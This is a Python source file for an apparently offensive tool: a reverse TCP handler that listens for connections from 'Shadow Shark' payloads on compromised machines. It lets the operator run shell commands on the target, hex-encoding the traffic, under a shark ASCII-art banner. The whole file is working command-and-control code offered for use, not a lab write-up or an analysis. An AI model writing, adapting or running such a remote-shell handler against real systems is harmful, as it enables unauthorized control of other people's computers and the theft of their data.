# -*- coding: utf-8 -*-
"""
This tool is a full fledged reverse TCP handler used to interact with Shadow Shark payloads.

@author: Mr. Shark Spam Bot
"""
import argparse
import socket
import sys
import codecs
import json

def get_arguments():
    '''Get the lhost and lport.'''
    parser = argparse.ArgumentParser(description='''This tool is a full fledged reverse TCP handler
used to interact with Shadow Shark payloads. Created by Mr. Shark Spam Bot.''')
    parser.add_argument('--lh', '--lhost', dest='lhost', required=True, type=str,
                        help='Your IP address.')
    parser.add_argument('--lp', '--lport', dest='lport', required=True, type=int,
                        help='The port to listen for connections on.')
    options = parser.parse_args()
    lhost = options.lhost
    lport = options.lport
    try:
        socket.inet_aton(lhost)
    except socket.error:
        parser.error('Invalid option specified for lhost.')
    return [lhost, lport]

def hex_handler(text, encode=False, decode=False):
    '''Encode or decode text using hex.'''
    if encode is True:
        new_text = text.encode()
        new_text = codecs.encode(new_text, encoding='hex')
        new_text = new_text.decode()
        new_text = json.dumps(new_text)
        new_text = new_text.encode()
    if decode is True:
        new_text = json.loads(text)
        new_text = new_text.encode()
        new_text = codecs.decode(new_text, encoding='hex')
        new_text = new_text.decode()
    return new_text

def listen():
    '''Accept the first incoming TCP connection.'''
    try:
        rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        arguments = get_arguments()
        lhost = arguments[0]
        lport = arguments[1]
        try:
            rev_socket.bind((lhost, lport))
        except OSError:
            print('\n[-] Lhost is not set to your IP or a process is currently running on lport.')
            print('[-] Terminating program.')
            sys.exit()
        rev_socket.listen(1)
        print(f'[*] A reverse TCP handler on {lhost}:{lport} has successfully started...')
        connection, address = rev_socket.accept()
        return [rev_socket, connection, address]
    except KeyboardInterrupt:
        print('\n[+] Ctrl + c detected.')
        print('[-] Terminating program.')
        rev_socket.close()
        sys.exit()

def main():
    '''Interact with the target by using a reverse TCP shell.'''
    try:
        rev_socket, connection, address = listen()
        rhost = address[0]
        rport = address[1]
        print(f'[+] A TCP connection from {rhost}:{rport} has been received.\n')

        try:
            while True:
                connection.send(hex_handler('directory', encode=True))
                directory = connection.recv(1024)
                directory = hex_handler(directory, decode=True)
                command = input(f'{directory} ')
                if command.lower().strip() == 'exit':
                    connection.send(hex_handler('exit', encode=True))
                    connection.close()
                    rev_socket.close()
                    break
                if not command.strip():
                    continue
                connection.send(hex_handler(command, encode=True))
                recv = b''
                while True:
                    try:
                        recv = recv + connection.recv(1024)
                        if not recv:
                            break
                        if recv[-1] == 34:
                            break
                    except ValueError:
                        continue
                try:
                    recv = hex_handler(recv, decode=True)
                except json.decoder.JSONDecodeError:
                    continue
                if recv.strip():
                    print(recv.strip())
        except ConnectionError:
            print('\n[-] The reverse TCP connection was broken.')
            print('[-] Terminating program.')
            connection.close()
            rev_socket.close()
            sys.exit()
    except KeyboardInterrupt:
        print('\n[+] Ctrl + c detected.')
        print('[-] Terminating program.')
        connection.send(hex_handler('exit', encode=True))
        connection.close()
        rev_socket.close()
        sys.exit()

if __name__ == '__main__':
    print('''
\t                                             ``
\t                                       ``-+yhh-
\t                                    `:ohNMMMy.                  `.-`
\t                                `-ohNMMMMMM:                `.+hNy-
\t             ``.-:+osyyyhhhhhdddmMMMMMMMMMm---:::--..``````+dMMMo
\t      `:+syhdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNMMMMMo/-`                          ./o+
\t  `+ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMms:`                 `:ohNMd:
\t`oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdo-          -+ymMMMMy-
\t :NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy/`  .+hNMMMMMNo.
\t  `/+shdmymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNhmMMMMMMMNo`
\t  osdhdosydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo`
\t  sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd/`
\t   ``:shNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy/.
\t       ``./ohdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdhhdmNMMMMMMNd+.
\t             ``.-:/+osyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNmdhs+-`` ````.:+yhmNMMNh+.
\t                       ```.-:/+syyyhhdMMMMMMMMddddddddddddhysMMMM-.`....``               ```.-/oys:
\t                                     `mMMMMMMM`````````````  :hNM+
\t                                      -mMMMMMM.                .+s.
\t                                       .yMMMMMh`
\t                                         :yNMMMh.
\t                                           .odNMm:
\t                                             `-/sh:
    ''')
    main()
